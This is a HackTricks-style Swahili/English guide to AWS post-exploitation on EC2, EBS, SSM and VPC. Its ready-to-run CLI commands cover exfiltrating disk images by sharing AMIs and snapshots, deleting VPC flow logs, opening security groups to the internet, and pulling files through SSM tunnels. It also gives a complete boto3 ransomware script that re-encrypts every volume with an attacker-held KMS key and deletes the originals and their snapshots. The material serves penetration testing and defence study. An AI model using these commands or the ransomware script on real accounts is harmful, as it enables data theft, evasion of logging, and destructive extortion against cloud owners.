# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Kwa maelezo zaidi angalia:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **VPC Mirror Hatari -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **inajirudia trafiki ya kuingia na kutoka kwa EC2 instances ndani ya VPC** bila haja ya kusakinisha chochote kwenye instances hizo. Trafiki iliyorudishwa kawaida itatumwa kwa kitu kama network intrusion detection system (IDS) kwa uchambuzi na ufuatiliaji.  
Mvamizi anaweza kutumia hili kunasa trafiki yote na kupata taarifa nyeti kutoka kwake:

Kwa maelezo zaidi angalia ukurasa huu:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Nakili instance inayokimbia

Instances mara nyingi huwa na aina fulani ya taarifa nyeti. Kuna njia tofauti za kuingia ndani (angalia [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Hata hivyo, njia nyingine ya kuona kile kilicho ndani ni **kuunda AMI na kuendesha instance mpya (hata kwenye account yako) kutoka kwake**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, ambazo kawaida zitakuwa na **habari nyeti**, kwa hiyo kuzichunguza kunapaswa kufichua taarifa hizi.\
Ikiwa utapata **volume without a snapshot** unaweza: **Create a snapshot** na kufanya hatua zifuatazo au tu **mount it in an instance** ndani ya akaunti:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Export an EC2 AMI straight to S3 using `CreateStoreImageTask` to obtain a raw disk image without snapshot sharing. Hii inaruhusu forensics kamili offline au data theft wakati ikiacha networking ya instance bila kubadilika.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Unganisha io1/io2 Multi-Attach volume kwenye instance ya pili na ui-mountiwe read-only ili kunyonya live data bila snapshots. Inafaa wakati victim volume tayari ina Multi-Attach imewezeshwa ndani ya AZ ileile.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Create an EC2 Instance Connect Endpoint, authorize ingress, na inject ephemeral SSH keys ili kupata private instances kupitia managed tunnel. Hii inatoa njia za haraka za lateral movement bila kufungua public ports.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Hamisha secondary private IP ya ENI ya victim kwa ENI inayoendeshwa na attacker ili kuiga trusted hosts ambazo ziko allowlisted kwa IP. Inaruhusu kupitisha internal ACLs au SG rules zilizounganishwa na anwani maalum.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Reassociate Elastic IP kutoka kwa instance ya victim kwenda kwa attacker ili kunasa inbound traffic au kuanzisha outbound connections zinazojiona zikitoka kwa trusted public IPs.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Ili sheria ya security group inamrejea customer-managed prefix list, kuongeza attacker CIDRs kwenye list hiyo kunapanua kimya kimya upatikanaji kwa kila dependent SG rule bila kuhariri SG yenyewe.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Tengeneza gateway au interface VPC endpoints ili kupata tena outbound access kutoka isolated subnets. Kutumia AWS-managed private links kunapitisha controls za IGW/NAT zilizokosekana kwa data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### VPC Flow Logs Cross-Account Exfiltration

Elekeza VPC Flow Logs kwenye attacker-controlled S3 bucket ili kukusanya kwa mfululizo network metadata (source/destination, ports) nje ya akaunti ya victim kwa reconnaissance ya muda mrefu.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Hata kama umeweka EC2 kwa kufunga ili hakuna trafiki iweze kutoka nje, bado inaweza **exfil via DNS**.

- **VPC Flow Logs hazitarekodi hili**.
- Huna ufikiaji wa AWS DNS logs.
- Zima hili kwa kuweka "enableDnsSupport" kuwa false kwa:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Attacker anaweza kuita API endpoints za akaunti anazodhibiti. Cloudtrail itarekodi miito hii na attacker ataweza kuona data iliyofukuliwa katika Cloudtrail logs.

### Open Security Group

Unaweza kupata ufikiaji zaidi wa huduma za mtandao kwa kufungua ports kama ifuatavyo:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Inawezekana kuendesha EC2 instance na kuisajili ili itumike kuendesha ECS instances, kisha kuiba data za ECS instances.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Ondoa VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Ruhusa zinazohitajika:

- `ssm:StartSession`

Mbali na utekelezaji wa amri, SSM inaruhusu uundaji wa tuneli ya trafiki (traffic tunneling) ambayo inaweza kutumiwa kuwezesha pivot kutoka kwa EC2 instances ambazo hazina upatikanaji wa mtandao kutokana na Security Groups au NACLs.
Moja ya mazingira ambapo hili ni muhimu ni pivoting kutoka [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) hadi private EKS cluster.

> Ili kuanza session unahitaji SessionManagerPlugin imewekwa: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Sakinisha SessionManagerPlugin kwenye mashine yako
2. Ingia kwenye Bastion EC2 ukitumia amri ifuatayo:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Pata kredensiali za muda za Bastion EC2 AWS kwa script ya [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Hamisha kredensiali kwenye mashine yako katika faili `$HOME/.aws/credentials` kama profaili `[bastion-ec2]`
5. Ingia kwenye EKS kama Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Sasisha sehemu ya `server` katika faili `$HOME/.kube/config` ili kuelekeza kwa `https://localhost`  
7. Tengeneza SSM tunnel kama ifuatavyo:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Trafiki kutoka kwa zana ya `kubectl` sasa imepangwa kupitia tuneli ya SSM kupitia Bastion EC2 na unaweza kufikia klasta ya EKS ya kibinafsi kutoka kwenye mashine yako mwenyewe kwa kuendesha:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Kumbuka kuwa muunganiko wa SSL utashindwa isipokuwa ukiteua bendera `--insecure-skip-tls-verify` (au sawa yake katika zana za ukaguzi za K8s). Kwa kuwa trafiki inapitia kupitia mtaro salama wa AWS SSM, uko salama dhidi ya aina yoyote ya mashambulizi ya MitM.

Hatimaye, mbinu hii si maalum kwa kushambulia private EKS clusters. Unaweza kuweka arbitrary domains na ports za pivot kwenda huduma nyingine yoyote ya AWS au custom application.

---

#### Quick Local ↔️ Remote Port Forward (AWS-StartPortForwardingSession)

Ikiwa unahitaji tu kupeleka mbele **one TCP port from the EC2 instance to your local host** unaweza kutumia the `AWS-StartPortForwardingSession` SSM document (no remote host parameter required):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Amri inaunda tundu la pande mbili kati ya workstation yako (`localPortNumber`) na bandari iliyochaguliwa (`portNumber`) kwenye instance **bila kufungua sheria zozote za inbound za Security-Group**.

Matumizi ya kawaida:

* **File exfiltration**
1. Kwenye instance, anzisha HTTP server ya haraka inayolenga saraka unayotaka exfiltrate:

```bash
python3 -m http.server 8000
```

2. Kutoka kwenye workstation yako, pakua faili kupitia SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Kupata programu za wavuti za ndani (mfano Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Kidokezo: Finyaza na ficha kwa usimbaji ushahidi kabla ya exfiltrating ili CloudTrail isirekodi yaliyomo kwa maandishi wazi:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Shiriki AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Tafuta taarifa nyeti katika AMIs za umma na za binafsi

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel ni zana iliyoundwa ili **kutafuta taarifa nyeti ndani ya Amazon Machine Images (AMIs) za umma au za binafsi**. Inafanya kwa otomatiki mchakato wa kuanzisha instances kutoka AMIs lengwa, ku-mount volumes zao, na kuchunguza siri au data nyeti zinazoweza kuwepo.

### Shiriki EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Hii ni ithibitisho la dhana linalofanana na maonyesho ya Ransomware yaliyotolewa katika noti za post-exploitation za S3. KMS inapaswa kubadilishwa jina kuwa RMS (Ransomware Management Service) kutokana na urahisi wake wa kutumika kusimba huduma mbalimbali za AWS.

Kwanza, kutoka kwenye akaunti ya 'attacker' ya AWS, tengeneza customer managed key ndani ya KMS. Kwa mfano huu tutamwachia AWS kusimamia data za ufunguo zangu, lakini katika tukio halisi mhusika mwenye nia mbaya angehifadhi data za ufunguo nje ya udhibiti wa AWS. Badilisha sera ya ufunguo ili kuruhusu Principal wa akaunti yoyote ya AWS kutumia ufunguo. Kwa sera hii ya ufunguo, jina la akaunti lilikuwa 'AttackSim' na sheria ya sera inayoruhusu upatikanaji wote inaitwa 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Kanuni ya key policy inahitaji yafuatayo kuwekewa ili kuruhusu uwezo wa kuitumia ku-encrypt EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Sasa tukiwa na key inayoweza kufikiwa hadharani kutumia. Tunaweza kutumia account ya 'victim' ambayo ina baadhi ya EC2 instances zilizozinduliwa na EBS volumes zisizo-encrypted zilizounganishwa. EBS volumes za account ya 'victim' ndizo tunazolenga kwa encryption; shambulio hili linafanywa chini ya dhana ya uvunjaji wa account ya AWS yenye ruhusa za juu.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Kama kwenye mfano wa S3 ransomware. Shambulio hili litatengeneza nakala za EBS volumes zilizounganishwa kwa kutumia snapshots, litumie key inayopatikana hadharani kutoka account ya 'attacker' ili ku-encrypt EBS volumes mpya, kisha liteke EBS volumes za awali kutoka kwa EC2 instances na kuzifuta, na hatimaye kufuta snapshots zilizotumika kutengeneza EBS volumes zilizosanifiwa kwa encryption. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Hii inasababisha kuwa kwenye account itabaki tu EBS volumes zilizofinywa (encrypted).

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Pia inastahili kutajwa, script ilizuia EC2 instances ili kutolewa (detach) na kufutwa kwa EBS volumes za awali. Volumes za awali zisizo-encrypted zimepotea sasa.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Ifuatayo, rudi kwenye key policy katika account ya 'attacker' na ondoa kanuni ya sera 'Outside Encryption' kutoka kwenye key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Subiri muda mfupi ili sera ya ufunguo mpya ienewe. Kisha rudi kwenye akaunti ya 'victim' na jaribu kuambatisha moja ya EBS volume mpya zilizososwa (encrypted). Utaona kwamba unaweza kuambatisha volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Lakini unapojaribu kuanzisha tena EC2 instance yenye EBS volume iliyosimbwa, itashindwa tu na itarudi kutoka kwenye hali ya 'pending' kurudi kwenye hali ya 'stopped' maisha yote kwa sababu EBS volume iliyounganishwa haiwezi kufunguliwa (decrypted) kwa kutumia ufunguo kwani sera ya ufunguo haimo tena ili kuruhusu hilo.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Hii ni script ya python iliyotumika. Inachukua creds za AWS za akaunti ya 'victim' na thamani ya AWS ARN inayopatikana hadharani kwa ufunguo utakaotumika kwa encryption. Script itafanya nakala zilizosimbwa za ALL available EBS volumes zilizounganishwa kwa ALL EC2 instances katika akaunti ya AWS inayolengwa, kisha itasimamisha kila EC2 instance, itatenganisha EBS volumes asili, kuzifuta, na hatimaye kufuta snapshots zote zilizotumiwa wakati wa mchakato. Hii itaacha tu EBS volumes zilizofsimbwa katika akaunti ya 'victim' iliyolengwa. TUMIA SCRIPT HII TU KATIKA MAZINGIRA YA MTIHANI; INA UHARIBU NA ITAFUTA VOLIMU ZOTE ASILI ZA EBS. Unaweza kuzirejesha kwa kutumia KMS key iliyotumika na kuzirekebisha kwenye hali yao ya awali kupitia snapshots, lakini nataka tu kukujulisha kuwa hii ni PoC ya ransomware mwishowe.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Marejeo

- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
